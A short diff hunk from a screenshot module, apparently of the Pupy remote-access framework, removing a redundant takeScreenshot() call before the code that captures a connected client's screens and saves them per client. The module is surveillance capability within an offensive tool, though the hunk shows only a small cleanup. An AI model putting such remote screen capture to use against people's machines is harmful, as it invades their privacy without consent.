@@ -72,7 +72,6 @@ class Screenshoter(PupyModule):
             config = self.client.pupsrv.config or PupyConfig()
             folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
 
-            rscreenshot.takeScreenshot()
             screenshots, error = rscreenshot.screenshot(args.screen)
             if not screenshots:
                 self.error(error)
